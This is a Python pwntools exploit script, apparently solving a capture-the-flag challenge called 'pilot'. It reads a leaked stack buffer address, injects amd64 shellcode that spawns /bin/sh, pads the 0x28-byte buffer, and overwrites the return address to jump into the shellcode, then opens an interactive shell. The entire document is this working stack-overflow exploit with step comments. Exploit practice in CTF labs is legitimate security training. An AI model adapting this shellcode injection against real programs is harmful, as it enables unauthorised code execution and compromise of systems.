from pwn import *

target = process("./pilot")

# steps:
# 1) parse program output to get array address
# 2) add shellcode for amd64 linux (or some other specification?)
# 3) pad to fill rest of user input buffer (0x28 bytes)
# 4) overwrite main's return address with address of user input array

# step 1
bufferAddr = target.recvuntil(b"Location:")
bufferAddr = target.recvline().strip(b"\n")
bufferAddr = int(bufferAddr, 16)
bufferAddr = p64(bufferAddr)

# step 2
shellcode = b"\x31\xf6\x48\xbf\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdf\xf7\xe6\x04\x3b\x57\x54\x5f\x0f\x05"

# step 3
padding = b"0" * (0x28 - len(shellcode))

# step 4
payload = shellcode + padding + bufferAddr  

target.sendline(payload)

target.interactive()

